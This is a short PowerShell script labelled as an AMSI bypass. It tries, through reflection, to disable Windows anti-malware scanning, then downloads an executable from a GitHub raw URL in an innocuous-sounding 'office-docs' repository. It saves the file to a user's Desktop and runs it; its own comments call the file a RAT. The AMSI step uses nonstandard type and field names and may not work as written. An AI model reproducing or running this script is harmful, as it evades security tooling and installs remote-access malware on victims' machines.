# AMSI Bypass
$amsi = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq "Microsoft.PowerShell.Amsi" }
$amsiType = $amsi.GetType().Assembly.GetType("Microsoft.PowerShell.Amsi.AmsiContext")
$amsiField = $amsiType.GetField("amsiSession", [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Instance)
$amsiField.SetValue([Microsoft.PowerShell.Amsi.AmsiContext]::new(), [IntPtr]::Zero)

$filePath = "C:\Users\ancho\Desktop\test_update.exe"
$url = "https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/update.exe"

# Download RAT
Invoke-WebRequest -Uri $url -OutFile $filePath

# Execute RAT
& $filePath